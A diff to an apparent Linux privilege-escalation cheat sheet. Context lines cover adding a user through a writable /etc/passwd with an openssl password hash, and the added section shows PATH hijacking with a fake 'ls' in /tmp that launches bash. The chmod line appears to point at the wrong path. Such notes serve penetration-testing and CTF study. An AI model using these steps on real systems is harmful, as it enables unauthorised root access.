@@ -66,3 +66,12 @@ If we have a writable /etc/passwd file, we can write a new line entry according 
 Create the password you want to add: "openssl passwd -1 -salt [salt] [password]"
 
 ```
+
+## $PATH Injection
+```
+cd /tmp
+echo "/bin/bash" > ls
+chmod +x /ls
+export PATH=/tmp:$PATH  <=== this exports our fake path
+Reset path back to default:  "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH"
+```
